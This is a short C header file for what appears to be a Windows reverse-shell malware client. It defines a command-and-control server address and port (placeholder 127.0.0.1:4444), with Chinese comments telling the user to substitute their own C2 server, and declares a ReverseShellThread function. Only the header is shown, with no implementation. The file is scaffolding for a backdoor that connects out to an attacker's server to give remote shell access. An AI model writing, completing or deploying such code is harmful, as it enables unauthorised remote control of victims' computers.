#ifndef CLIENT_H
#define CLIENT_H

#define C2_SERVER_IP "127.0.0.1"  // 修改为你的 C2 服务器 IP
#define C2_SERVER_PORT 4444        // 修改为你的 C2 服务器端口
#define BUFFER_SIZE 4096
DWORD WINAPI ReverseShellThread(LPVOID lpParameter);

#endif // client_h